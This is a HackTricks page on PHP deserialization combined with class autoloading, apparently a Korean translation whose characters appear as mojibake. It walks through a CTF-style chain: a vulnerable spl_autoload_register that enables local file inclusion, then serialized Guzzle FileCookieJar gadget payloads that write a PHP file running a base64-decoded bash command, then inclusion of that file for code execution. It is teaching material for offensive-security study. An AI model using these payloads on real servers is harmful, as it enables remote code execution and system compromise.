# PHP - Deserialization + Autoload Classes

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

ë¨¼ì €, [**ìë™ ë¡œë”© í´ë˜ìŠ¤**](https://www.php.net/manual/en/language.oop5.autoload.php)ê°€ ë¬´ì—‡ì¸ì§€ í™•ì¸í•´ì•¼ í•©ë‹ˆë‹¤.

## PHP deserialization + spl\_autoload\_register + LFI/Gadget

ìš°ë¦¬ëŠ” **ì›¹ì•±ì—ì„œ PHP deserialization**ì„ ë°œê²¬í–ˆì§€ë§Œ **`phpggc`** ë‚´ë¶€ì— **ê°€ì ¯ì— ì·¨ì•½í•œ ë¼ì´ë¸ŒëŸ¬ë¦¬**ê°€ **ì—†ëŠ”** ìƒí™©ì— ìˆìŠµë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ê°™ì€ ì»¨í…Œì´ë„ˆì— **ì·¨ì•½í•œ ë¼ì´ë¸ŒëŸ¬ë¦¬ê°€ ìˆëŠ” ë‹¤ë¥¸ composer ì›¹ì•±**ì´ ìˆì—ˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ ëª©í‘œëŠ” **ë‹¤ë¥¸ ì›¹ì•±ì˜ composer ë¡œë”ë¥¼ ë¡œë“œí•˜ê³ ** ì´ë¥¼ ì•…ìš©í•˜ì—¬ **deserializationì— ì·¨ì•½í•œ ì›¹ì•±ì˜ ê°€ì ¯ìœ¼ë¡œ í•´ë‹¹ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ì•…ìš©í•˜ëŠ” ê²ƒ**ì´ì—ˆìŠµë‹ˆë‹¤.

ë‹¨ê³„:

* **deserialization**ì„ ë°œê²¬í–ˆì§€ë§Œ í˜„ì¬ ì•± ì½”ë“œì— **ê°€ì ¯ì´ ì—†ìŠµë‹ˆë‹¤.**
* ë‹¤ìŒê³¼ ê°™ì€ **`spl_autoload_register`** í•¨ìˆ˜ë¥¼ ì•…ìš©í•˜ì—¬ **`.php` í™•ì¥ìë¥¼ ê°€ì§„ ë¡œì»¬ íŒŒì¼ì„ ë¡œë“œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.**
* ì´ë¥¼ ìœ„í•´ í´ë˜ìŠ¤ ì´ë¦„ì´ **`$name`** ì•ˆì— ë“¤ì–´ê°€ë„ë¡ deserializationì„ ì‚¬ìš©í•©ë‹ˆë‹¤. ì§ë ¬í™”ëœ ê°ì²´ì˜ í´ë˜ìŠ¤ ì´ë¦„ì— **"/" ë˜ëŠ” "."**ë¥¼ ì‚¬ìš©í•  ìˆ˜ ì—†ì§€ë§Œ, **ì½”ë“œ**ëŠ” **ì–¸ë”ìŠ¤ì½”ì–´**("\_")ë¥¼ **ìŠ¬ë˜ì‹œ**("/")ë¡œ **ëŒ€ì²´**í•˜ê³  ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ `tmp_passwd`ì™€ ê°™ì€ í´ë˜ìŠ¤ ì´ë¦„ì€ `/tmp/passwd.php`ë¡œ ë³€í™˜ë˜ê³ , ì½”ë“œëŠ” ì´ë¥¼ ë¡œë“œí•˜ë ¤ê³  ì‹œë„í•©ë‹ˆë‹¤.\
**ê°€ì ¯ ì˜ˆì‹œ**ëŠ”: **`O:10:"tmp_passwd":0:{}`**ì…ë‹ˆë‹¤.
```php
spl_autoload_register(function ($name) {

if (preg_match('/Controller$/', $name)) {
$name = "controllers/${name}";
} elseif (preg_match('/Model$/', $name)) {
$name = "models/${name}";
} elseif (preg_match('/_/', $name)) {
$name = preg_replace('/_/', '/', $name);
}

$filename = "/${name}.php";

if (file_exists($filename)) {
require $filename;
}
elseif (file_exists(__DIR__ . $filename)) {
require __DIR__ . $filename;
}
});
```
{% hint style="success" %}
íŒŒì¼ ì—…ë¡œë“œê°€ ê°€ëŠ¥í•˜ê³  **`.php` í™•ì¥ì**ê°€ ìˆëŠ” íŒŒì¼ì„ ì—…ë¡œë“œí•  ìˆ˜ ìˆë‹¤ë©´, ì´ ê¸°ëŠ¥ì„ **ì§ì ‘ ì•…ìš©**í•˜ì—¬ ì´ë¯¸ RCEë¥¼ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
{% endhint %}

ë‚´ ê²½ìš°ì—ëŠ” ê·¸ëŸ° ê²ƒì´ ì—†ì—ˆì§€ë§Œ, **ê°™ì€ ì»¨í…Œì´ë„ˆ** ì•ˆì— **`phpggc` ê°€ì ¯ì— ì·¨ì•½í•œ ë¼ì´ë¸ŒëŸ¬ë¦¬ê°€ ìˆëŠ” ë‹¤ë¥¸ composer ì›¹ í˜ì´ì§€ê°€ ìˆì—ˆìŠµë‹ˆë‹¤.**

* ì´ ë‹¤ë¥¸ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ë¡œë“œí•˜ë ¤ë©´ ë¨¼ì € **ê·¸ ë‹¤ë¥¸ ì›¹ ì•±ì˜ composer ë¡œë”ë¥¼ ë¡œë“œí•´ì•¼** í•©ë‹ˆë‹¤(í˜„ì¬ ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ ë¡œë”ëŠ” ë‹¤ë¥¸ ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ ë¼ì´ë¸ŒëŸ¬ë¦¬ì— ì ‘ê·¼í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤). **ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ ê²½ë¡œë¥¼ ì•Œê³ ** ìˆë‹¤ë©´, **`O:28:"www_frontend_vendor_autoload":0:{}`**ë¥¼ ì‚¬ìš©í•˜ì—¬ ì´ë¥¼ ë§¤ìš° ì‰½ê²Œ ë‹¬ì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. (ë‚´ ê²½ìš° composer ë¡œë”ëŠ” `/www/frontend/vendor/autoload.php`ì— ìˆì—ˆìŠµë‹ˆë‹¤.)
* ì´ì œ **ë‹¤ë¥¸ ì•±ì˜ composer ë¡œë”ë¥¼ ë¡œë“œ**í•  ìˆ˜ ìˆìœ¼ë¯€ë¡œ, **ì‚¬ìš©í•  phpgcc** **í˜ì´ë¡œë“œë¥¼ ìƒì„±í•  ì‹œê°„ì…ë‹ˆë‹¤**. ë‚´ ê²½ìš°ì—ëŠ” **`Guzzle/FW1`**ì„ ì‚¬ìš©í•˜ì—¬ **íŒŒì¼ ì‹œìŠ¤í…œ ë‚´ì˜ ëª¨ë“  íŒŒì¼ì„ ì“¸ ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤.**
* ì°¸ê³ : **ìƒì„±ëœ ê°€ì ¯ì´ ì‘ë™í•˜ì§€ ì•Šì•˜ìŠµë‹ˆë‹¤.** ì‘ë™í•˜ê²Œ í•˜ë ¤ë©´ **`chain.php`**ì˜ phpggc í˜ì´ë¡œë“œë¥¼ **ìˆ˜ì •**í•˜ê³  **ëª¨ë“  ì†ì„±**ì„ **privateì—ì„œ publicìœ¼ë¡œ** ì„¤ì •í–ˆìŠµë‹ˆë‹¤. ê·¸ë ‡ì§€ ì•Šìœ¼ë©´ ë¬¸ìì—´ì„ ì—­ì§ë ¬í™”í•œ í›„ ìƒì„±ëœ ê°ì²´ì˜ ì†ì„±ì— ê°’ì´ ì—†ì—ˆìŠµë‹ˆë‹¤.
* ì´ì œ **ë‹¤ë¥¸ ì•±ì˜ composer ë¡œë”ë¥¼ ë¡œë“œí•  ë°©ë²•ì´ ìˆê³ **, **ì‘ë™í•˜ëŠ” phpggc í˜ì´ë¡œë“œê°€ ìˆì§€ë§Œ**, **ê°€ì ¯ì´ ì‚¬ìš©ë  ë•Œ ë¡œë”ê°€ ë¡œë“œë˜ë„ë¡ ë™ì¼í•œ ìš”ì²­ì—ì„œ ì´ë¥¼ ìˆ˜í–‰í•´ì•¼** í•©ë‹ˆë‹¤. ì´ë¥¼ ìœ„í•´ ë‘ ê°œì˜ ê°ì²´ê°€ í¬í•¨ëœ ì§ë ¬í™”ëœ ë°°ì—´ì„ ë³´ëƒˆìŠµë‹ˆë‹¤:
* **ë¨¼ì € ë¡œë”ê°€ ë¡œë“œë˜ê³  ê·¸ ë‹¤ìŒì— í˜ì´ë¡œë“œê°€ ë¡œë“œë˜ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.**

{% code overflow="wrap" %}
```php
a:2:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}}
```
{% endcode %}

* ì´ì œ ìš°ë¦¬ëŠ” **íŒŒì¼ì„ ìƒì„±í•˜ê³  ì“¸ ìˆ˜ ìˆì§€ë§Œ**, ì‚¬ìš©ìëŠ” **ì›¹ ì„œë²„ ë‚´ì˜ ì–´ë–¤ í´ë”ì—ë„ ì“¸ ìˆ˜ ì—†ìŠµë‹ˆë‹¤**. ê·¸ë˜ì„œ í˜ì´ë¡œë“œì—ì„œ ë³¼ ìˆ˜ ìˆë“¯ì´, PHPëŠ” **`system`**ì„ í˜¸ì¶œí•˜ì—¬ **base64**ë¡œ **`/tmp/a.php`**ì— ìƒì„±ë©ë‹ˆë‹¤. ê·¸ëŸ° ë‹¤ìŒ, ìš°ë¦¬ëŠ” **ë‹¤ë¥¸ ì›¹ì•±ì˜ composer ë¡œë”ë¥¼ ë¡œë“œí•˜ê¸° ìœ„í•´ LFIì— ì‚¬ìš©í–ˆë˜ ì²« ë²ˆì§¸ ìœ í˜•ì˜ í˜ì´ë¡œë“œë¥¼ ì¬ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤** **ìƒì„±ëœ `/tmp/a.php`** íŒŒì¼ì„ ë¡œë“œí•˜ê¸° ìœ„í•´. ê·¸ê²ƒì„ ì—­ì§ë ¬í™” ê°€ì ¯ì— ì¶”ê°€í•˜ê¸°ë§Œ í•˜ë©´ ë©ë‹ˆë‹¤:&#x20;

{% code overflow="wrap" %}
```php
a:3:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}s:6:"Extra3";O:5:"tmp_a":0:{}}
```
{% endcode %}

**í˜ì´ë¡œë“œ ìš”ì•½**

* **ë‹¤ë¥¸ ì›¹ì•±ì˜ composer autoload**ë¥¼ ë™ì¼í•œ ì»¨í…Œì´ë„ˆì—ì„œ ë¡œë“œ
* **phpggc ê°€ì ¯**ì„ ë¡œë“œí•˜ì—¬ ë‹¤ë¥¸ ì›¹ì•±ì˜ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ì•…ìš© (ì—­ì§ë ¬í™”ì— ì·¨ì•½í•œ ì´ˆê¸° ì›¹ì•±ì—ëŠ” ë¼ì´ë¸ŒëŸ¬ë¦¬ì— ê°€ì ¯ì´ ì—†ìŒ)
* ê°€ì ¯ì€ **/tmp/a.php**ì— ì•…ì„± ëª…ë ¹ì–´ê°€ í¬í•¨ëœ PHP í˜ì´ë¡œë“œë¡œ íŒŒì¼ì„ ìƒì„±
* í˜ì´ë¡œë“œì˜ ë§ˆì§€ë§‰ ë¶€ë¶„ì€ **ìƒì„±ëœ PHP íŒŒì¼ì„ ë¡œë“œ**í•˜ì—¬ ëª…ë ¹ì–´ë¥¼ ì‹¤í–‰

ë‚˜ëŠ” **ì´ ì—­ì§ë ¬í™”ë¥¼ ë‘ ë²ˆ í˜¸ì¶œí•´ì•¼ í–ˆë‹¤**. ë‚´ í…ŒìŠ¤íŠ¸ì—ì„œ ì²« ë²ˆì§¸ë¡œ `/tmp/a.php` íŒŒì¼ì´ ìƒì„±ë˜ì—ˆì§€ë§Œ ë¡œë“œë˜ì§€ ì•Šì•˜ê³ , ë‘ ë²ˆì§¸ë¡œëŠ” ì˜¬ë°”ë¥´ê²Œ ë¡œë“œë˜ì—ˆë‹¤.

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
